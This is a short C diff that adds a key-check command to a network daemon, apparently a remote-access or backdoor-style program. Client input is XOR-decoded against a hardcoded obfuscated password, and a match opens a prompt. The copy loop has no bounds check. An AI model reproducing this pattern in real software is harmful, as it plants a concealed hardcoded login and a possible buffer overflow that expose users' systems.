@@ -66,3 +66,21 @@ void 	cmd_log(t_deamon *durex, int index)
 			durex->clients[index].log);
 	strcat(durex->clients[index].log, "log\n");
 }
+
+void 	cmd_key(t_deamon *durex, int index)
+{
+	char buf[MAX_BUFF] = {0};
+	char *psw = "mkynwqy\0";
+
+
+	for (int i = 0; durex->clients[index].read_buffer[i]; ++i)
+		buf[i] = durex->clients[index].read_buffer[i] ^ 24;
+	if (!memcmp(buf, psw, strlen(psw)))
+	{
+		durex->clients[index].auth = true;
+		send(durex->clients[index].fd, "> ", 2, 0);
+	}
+	else
+		send(durex->clients[index].fd, "Key: ", 5, 0);
+	bzero(durex->clients[index].read_buffer, MAX_BUFF);
+}
